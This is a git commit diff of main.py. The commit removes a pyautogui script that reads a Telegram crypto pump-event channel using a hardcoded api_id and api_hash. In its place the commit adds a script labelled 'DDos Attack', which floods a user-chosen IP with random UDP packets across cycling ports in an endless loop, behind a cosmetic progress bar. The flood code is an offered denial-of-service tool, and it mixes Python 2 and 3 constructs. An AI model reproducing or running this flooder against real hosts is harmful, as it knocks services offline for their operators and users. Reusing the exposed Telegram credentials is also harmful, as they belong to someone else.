b111f51642d14d175976c3f0c1ecff0e03ef4cf6
2006gur <98400561+2006gur@users.noreply.github.com>
2022-04-28 21:43:13 +0200

    Add files via upload

--- main.py
+++ main.py
@@ -1,40 +1,43 @@
-import pyautogui
-from telethon import TelegramClient, events, sync
+import sys
+import os
+import time
+import socket
+import random
 
-Coin_name = (input("Coin name: "))
-api_id = 12444392
-api_hash = '6002b94f2240a52c07e068858d8cf47c'
-client = TelegramClient('session_name', api_id, api_hash)
-client.start()
-channel_username = 't.me/hotbitpumpevents'
+from datetime import datetime
 
-if Coin_name == "YA":
-    for messages in client.get_messages(channel_username):
-        pyautogui.click(x=133, y=160)
-        pyautogui.sleep(0.05)
-        pyautogui.write(messages.message)
-        pyautogui.sleep(0.1)
-        pyautogui.click(x=97, y=218)
-        pyautogui.sleep(0.07)
-        pyautogui.click(x=1083, y=586)
-        pyautogui.sleep(0.07)
-        pyautogui.click(x=1047, y=676)
-        pyautogui.sleep(0.4)
-        pyautogui.click(x=742, y=465)
-        pyautogui.sleep(1.5)
-        pyautogui.click(button='right', x=139, y=18)
-        pyautogui.sleep(0.3)
-        pyautogui.click(x=225, y=150)
-        pyautogui.sleep(5)
-        pyautogui.click(x=1347, y=585)
-        pyautogui.sleep(0.1)
-        pyautogui.doubleClick(x=256, y=199)
-        pyautogui.sleep(0.2)
-        pyautogui.hotkey('ctrl', 'c')
-        pyautogui.sleep(0.1)
-        pyautogui.doubleClick(x=1236, y=527)
-        pyautogui.hotkey('ctrl', 'v')
-        pyautogui.sleep(0.1)
-        pyautogui.click(x=1234, y=676)
-        pyautogui.sleep(0.3)
-        pyautogui.click(x=742, y=465)
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+os.system("clear")
+os.system("figlet DDos Attack")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print("[                    ] 0% ")
+time.sleep(5)
+print("[=====               ] 25%")
+time.sleep(5)
+print("[==========          ] 50%")
+time.sleep(5)
+print("[===============     ] 75%")
+time.sleep(5)
+print("[====================] 100%")
+time.sleep(3)
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
+    if port == 65534:
+        port = 1
